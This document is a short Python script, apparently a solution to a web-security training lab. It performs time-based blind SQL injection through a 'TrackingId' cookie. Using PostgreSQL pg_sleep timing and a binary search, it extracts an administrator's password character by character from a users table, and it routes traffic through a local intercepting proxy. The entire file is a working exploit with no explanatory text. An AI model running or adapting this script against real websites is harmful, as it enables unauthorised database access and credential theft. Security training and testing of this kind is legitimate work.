#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080',
           'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ''
    for i in range(1, 21):
        st = 32
        ed = 126
        while st < ed:
            mid = (st + ed) // 2
            sqli_payload = \
                "'|| (SELECT CASE WHEN ((select ascii(substring(password, %s, 1)) from users limit 1) > %s) THEN pg_sleep(2) ELSE pg_sleep(0) END )--" % (i, mid)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'TTJO355ZB0sqCpoY' + sqli_payload_encoded,
                       'session': 'yaS0iPhGPhRQMU0aTCAyk8BfYPByfuwB'}
            r = requests.get(url, cookies=cookies, verify=False,
                             proxies=proxies)
            if r.elapsed.total_seconds() < 1.0:
                ed = mid
                sys.stdout.write('\r' + password_extracted + chr(mid))
                sys.stdout.flush()
            else:
                st = mid + 1
                sys.stdout.write('\r' + password_extracted + chr(mid))
                sys.stdout.flush()
        password_extracted += chr(st)
        sys.stdout.write('\r' + password_extracted)
        sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print('(+) Usage: %s <url>' % sys.argv[0])
        print('(+) Example: %s www.example.com' % sys.argv[0])

    url = sys.argv[1]
    print('(+) Retrieving administrator password...')
    sqli_password(url)


if __name__ == '__main__':
    main()
